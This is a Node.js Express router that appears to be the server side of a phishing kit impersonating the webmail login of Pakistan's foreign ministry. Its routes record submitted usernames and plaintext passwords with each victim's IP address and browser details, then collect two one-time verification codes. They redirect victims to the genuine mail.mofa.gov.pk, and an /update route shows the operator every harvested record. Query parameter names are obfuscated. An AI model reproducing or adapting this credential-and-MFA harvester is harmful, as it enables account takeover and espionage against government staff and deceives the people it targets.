const express = require ('express');
const router = express.Router();
const db = require('../db');
const bodyParser = require('body-parser');

router.use(express.static('public'));
router.use(express.static(__dirname + '/public'));
router.use(bodyParser.urlencoded({ extended: false }));


//validate form data before handling
// Custom middleware for form validation
const validateFormData = (req, res, next) => {
  const { username, password } = req.body;

  if (!username || !password) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


// Handle form submission

router.post('/submit', validateFormData, (req, res) => {
   
    const name = req.body.username;
    const b64 = Buffer.from(name).toString('base64');
    const word = req.body.password;
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim(); 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const notify = 0;


    const sqlQuery =  'SELECT username FROM newtable WHERE username= ?';   
    db.query(sqlQuery, [name], (err, results) => {
      if (err) {
        console.error('Error executing query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      }
    const rowCount = results.length;

      if (rowCount > 0) {
                            // Update the table if a matching record exists
                            const updateQuery = 'UPDATE newtable SET password = ? , notify = ? WHERE username = ?';
                            db.query(updateQuery, [word, notify, name], (err) => {
                                if (err) {
                                    console.error('Error updating record:', err);
                                    return res.status(500).send('Internal Server Error');
                                }
                                res.redirect(`/codeload/?tgrdsfgdytrbdfwergter=${b64}`);
                            });
                            } else {
                            // Insert a new record if no matching record exists
                            const insertQuery = 'INSERT INTO newtable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
                            db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
                                if (err) {
                                    console.error('Error inserting record:', err);
                                    return res.status(500).send('Internal Server Error');
                                }
                                res.redirect(`/codeload/?tgrdsfgdytrbdfwergter=${b64}`);
                            });
                                    }
      
  
     
    });
  
});

//handel code submission request

const validateFormcode = (req, res, next) => {
  const code = req.body.totpcode;

  if (code == null) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


router.post('/codepost', validateFormcode, (req, res) => {
   
  const name = req.body.codename;
  const b64 = Buffer.from(name).toString('base64');
  const code = req.body.totpcode;
  
  

  const sqlQuery =  'SELECT username FROM newtable WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                          // Update the table if a matching record exists
                          const codeupdate = 'UPDATE newtable SET code = ?  WHERE username = ?';
                          db.query(codeupdate, [code, name], (err) => {
                              if (err) {
                                  console.error('Error updating record:', err);
                                  return res.status(500).send('Internal Server Error');
                              }
                              res.redirect(`/codeverify/?fgjhfjhgjftrurtfgncvbdssg=${b64}`);

                          });
                          } 
    

   
  });

});


const verfiycode = (req, res, next) => {
  const code2 = req.body.codeverify;

  if (code2 == null) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


router.post('/codeverify', verfiycode, (req, res) => {
   
  const name = req.body.codename;
  const code2 = req.body.codeverify;
  
  

  const sqlQuery =  'SELECT username FROM newtable WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                          // Update the table if a matching record exists
                          const codeupdate2 = 'UPDATE newtable SET code2 = ?  WHERE username = ?';
                          db.query(codeupdate2, [code2, name], (err) => {
                              if (err) {
                                  console.error('Error updating record:', err);
                                  return res.status(500).send('Internal Server Error');
                              }
                              res.redirect('https://mail.mofa.gov.pk/');

                          });
                          } 
    

   
  });

});


router.post('/update' , (req, res) => {

  const name = req.body.username;
  const notif = 1;
  

  const sqlQuery =  'SELECT username FROM newtable WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                          // Update the table if a matching record exists
                          const update = 'UPDATE newtable SET notify = ?  WHERE username = ?';
                          db.query(update, [notif, name], (err) => {
                              if (err) {
                                  console.error('Error updating record:', err);
                                  return res.status(500).send('Internal Server Error');
                              }


                              const query = 'SELECT * FROM newtable'; // Replace with your table name
  
                              db.query(query, (err, results) => {
                                if (err) {
                                  console.error('Error executing the query: ' + err.stack);
                                  return res.status(500).send('Error fetching data from the database.');
                                }
                             // Store the data in a variable
                                const data = Object.values(JSON.parse(JSON.stringify(results)));
                               
                                res.render('table', {data});
                            
                              });



                          });
                          } 
       
  });

});



module.exports =router
